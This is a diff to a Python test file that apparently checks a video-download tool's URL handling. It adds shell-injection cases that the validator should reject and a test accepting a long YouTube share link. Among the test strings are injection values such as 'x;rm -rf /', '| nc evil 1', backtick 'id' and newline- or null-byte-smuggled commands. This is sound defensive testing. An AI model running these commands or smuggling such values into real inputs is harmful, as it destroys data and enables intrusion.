@@ -150,6 +150,11 @@ def test_resolve_plan_rejects_shell_metacharacters() -> None:
         "https://ex.com/`id`",
         "https://ex.com/x;rm -rf /",
         "https://ex.com/ | nc evil 1",
+        "https://ex.com/x > file",
+        "https://ex.com/x < file",
+        "https://ex.com/x\nid",
+        "https://ex.com/x\rid",
+        "https://ex.com/x\0id",
     ):
         with pytest.raises(UserError):
             resolve_plan(
@@ -158,6 +163,29 @@ def test_resolve_plan_rejects_shell_metacharacters() -> None:
                 output_root=Path("/out"),
                 resolver=resolver,
             )
+
+
+def test_resolve_plan_accepts_a_multi_parameter_url(tmp_path: Path) -> None:
+    """A share link keeps every query parameter: accepted, never rewritten."""
+    url = (
+        "https://www.youtube.com/watch?v=hsLiJP2rqS8"
+        "&list=RDGMEMQ1dJ7wXfLlqCJ7yduJHqQ&index=2&t=42s&si=AbCdEf123"
+    )
+    resolver = _FakeResolver(
+        {
+            url: _FakeMetadata(
+                title="t",
+                uploader="u",
+                ext="mp4",
+                is_live=False,
+                format_description="MP4 1080p",
+                video_id="hsLiJP2rqS8",
+            )
+        }
+    )
+    plan = resolve_plan(url, PhoneSafeProfile(), tmp_path, resolver)
+    assert plan.url == url
+    assert resolver.calls == [url]
 
 
 def test_resolve_plan_does_not_treat_dash_prefix_as_flag(tmp_path: Path) -> None:
